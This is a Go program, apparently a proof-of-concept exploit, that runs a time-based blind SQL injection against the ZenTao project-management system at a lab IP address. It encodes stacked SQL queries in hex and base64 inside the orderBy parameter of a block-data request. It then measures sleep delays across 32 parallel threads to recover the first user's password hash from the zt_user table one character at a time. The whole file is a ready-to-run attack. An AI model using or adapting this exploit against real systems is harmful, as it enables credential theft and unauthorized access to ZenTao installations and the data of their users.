package main

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"net/http"
	"strconv"
	"sync"
	"time"
)

var url string = "http://192.168.58.129/zentao"
var payload string = "/index.php?m=block&f=main&mode=getblockdata&blockid=case&param="
var pwd [32]string
var poc string
var t1 [32]int64
var t2 [32]int64
var wg sync.WaitGroup

func requestByHead(url string) {
	request, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		panic(err)
	}
	request.Header.Add("user-agent", "illa/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0")
	request.Header.Add("referer", "http://192.168.58.129/zentao/")

	r, err := http.DefaultClient.Do(request)
	if err != nil {
		return //err.Error()
	}
	defer func() { _ = r.Body.Close() }()
	if err != nil {
		return //err.Error()
	}
	return
}

func sqli(n int, i int) string {
	sn := strconv.Itoa(n)
	si := strconv.Itoa(i)
	//poc='select (if (ascii(substr((select account from zt_user limit 0,1),%s,1))=%s,sleep(2),1))' % (n,i)
	poc = "select (if (ascii(substr((select password from zt_user limit 0,1)," + sn + ",1))=" + si + ",sleep(2),1))"
	bt := []byte(poc)
	sqlhex := hex.EncodeToString(bt)
	exp := "{\"orderBy\":\"order limit 1;SET @SQL=0x" + sqlhex + ";PREPARE pord FROM @SQL;EXECUTE pord;-- -\",\"num\":\"1,1\",\"type\":\"openedbyme\"}"
	s := base64.StdEncoding.EncodeToString([]byte(exp))
	return s
}

func gogogo(n int) {
	for i := 32; i < 127; i++ {
		sql := sqli(n, i)

		t1[n-1] = time.Now().UnixMilli()
		requestByHead(url + payload + sql)
		t2[n-1] = time.Now().UnixMilli()
		if t2[n-1]-t1[n-1] < 2000 {
			continue
		} else {
			s := string(rune(i))
			fmt.Printf("s: %v\n", s)
			pwd[n-1] = s
			fmt.Printf("pwd: %v\n", pwd)
			break
		}
	}
	wg.Add(-1)
}
func main() {
	fmt.Println("正在分配线程，请稍等")
	for n := 1; n < 33; n++ {
		wg.Add(1)
		go gogogo(n)
	}
	wg.Wait()
}
